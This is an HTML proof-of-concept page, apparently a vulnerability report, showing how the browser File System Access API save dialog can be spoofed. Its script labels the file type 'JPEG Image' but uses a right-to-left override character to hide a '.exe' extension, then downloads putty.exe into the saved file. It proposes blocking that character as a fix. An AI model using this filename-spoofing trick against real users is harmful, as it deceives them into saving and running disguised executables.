<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>File System Access API - save As JPEG executable</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="favicon.png">
</head>

<body>
    <h3>File System Access API - Save shows saving as JPEG, however, download as an executable exe + spoof filename with
        RTL character</h3>
    <h4>Found by Maciej Pulikowski - maciekpul@gmail.com</h4>

    <hr>
    <h3>Gif example/proof:</h3>
    <a href="rtltrick.gif" target="_blank">GIF URL</a>
    <hr>
    <h3>Code example/proof:</h3>
    <div style="display: flex; flex-direction: column">
        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
        <div>
            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
        </div>

    </div>
    <script>

        const butSaveNewFile = document.getElementById('addNewFile')
        butSaveNewFile.addEventListener('mouseup', async () => {
            const options = {
                types: [
                    {
                        description:
                            'JPEG Image (*.jpeg)',
                        accept: {
                            'text/plain': ['.\u202egepj\u202e.moc.segami.www.exe']
                        },
                        content: 'C:\\Windows\\system32\\calc.exe'
                    }
                ]
            }
            debugger;

            const handle = await window.showSaveFilePicker(options)
            const writable = await handle.createWritable()
            const response = await fetch('putty.exe');
            await response.body.pipeTo(writable);
            alert('File saved')
        })
    </script>
    <hr>
    <h3>Explanation:</h3>
    <img src="RTLExplanation.png" alt="awesome code" width="1021" height="576">
    <hr>
    <h3>Solution:</h3>
    <p style="font-size: 25px">Block \u202e - RTL character</p>

</body>

</html>
